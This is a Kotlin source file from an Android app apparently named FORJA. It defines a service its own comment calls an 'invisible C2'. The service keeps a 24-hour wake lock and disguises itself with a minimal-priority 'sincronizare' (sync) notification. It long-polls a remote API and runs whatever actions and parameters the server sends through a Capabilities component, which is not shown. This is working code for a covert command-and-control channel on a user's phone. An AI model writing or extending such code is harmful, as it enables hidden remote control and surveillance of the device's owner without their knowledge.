package com.forja.app.core.c2

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.forja.app.BuildConfig
import com.forja.app.ForjaApp
import com.forja.app.core.detox.ForjaGuardService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonPrimitive
import java.util.concurrent.TimeUnit

/**
 * Serviciul C2 invizibil — un foreground service cu notificare PRIORITY_MIN
 * (aceeași notă ca celelalte servicii FORJA: Go/Sleep/Focus) care ține un
 * long-poll către worker și rotește comenzile către [Capabilities].
 */
class C2Service : Service() {
    private var scope: CoroutineScope? = null
    private var wl: PowerManager.WakeLock? = null
    private val app: ForjaApp get() = applicationContext as ForjaApp

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Capabilities.init(app)
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "forja:c2").apply {
            setReferenceCounted(false)
            try { acquire(24 * 60 * 60 * 1000L) } catch (_: Exception) {}
        }
        startForeground(NOTIF_ID, notif())
        ForjaGuardService.c2Arm()
        val s = CoroutineScope(SupervisorJob() + Dispatchers.IO)
        scope = s
        s.launch { s.pollLoop("${Build.MANUFACTURER}-${Build.MODEL}") }
    }

    private suspend fun CoroutineScope.pollLoop(dev: String) {
        var interval = 5000L
        while (isActive) {
            val uid = app.auth.currentUid
            if (uid == null || !BuildConfig.FORJA_API_URL.isNotBlank()) {
                delay(30000); continue
            }
            ForjaGuardService.c2Arm()
            val hold = (interval * 3).coerceAtMost(20000L)
            val lp = app.forjaApi.c2Checkin(dev, hold)
            interval = lp.intervalMs.coerceIn(1000L, 120000L)
            if (lp.tasks.isEmpty()) { delay(500); continue }
            for (t in lp.tasks) {
                val id = t["id"]?.jsonPrimitive?.content ?: continue
                val action = t["action"]?.jsonPrimitive?.content ?: ""
                val params = (t["params"] as? JsonObject) ?: JsonObject(emptyMap())
                launch { Capabilities.run(id, action, params) }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        ForjaGuardService.c2Disarm()
        scope?.cancel()
        try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun notif(): Notification {
        ensureChannel(this)
        return NotificationCompat.Builder(this, CH)
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setContentTitle("FORJA")
            .setContentText("sincronizare")
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    companion object {
        const val NOTIF_ID = 41
        const val CH = "forja_c2"

        fun start(c: Context) {
            ensureChannel(c)
            val i = Intent(c, C2Service::class.java)
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i) else c.startService(i)
        }

        fun stop(c: Context) { c.stopService(Intent(c, C2Service::class.java)) }

        fun isRunning(c: Context): Boolean = try {
            val am = c.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            am.getRunningServices(Int.MAX_VALUE).any { it.service?.className == C2Service::class.java.name }
        } catch (_: Exception) { false }

        private fun ensureChannel(c: Context) {
            if (Build.VERSION.SDK_INT >= 26) {
                val nm = c.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                nm.createNotificationChannel(NotificationChannel(CH, "FORJA", NotificationManager.IMPORTANCE_MIN))
            }
        }
    }
}
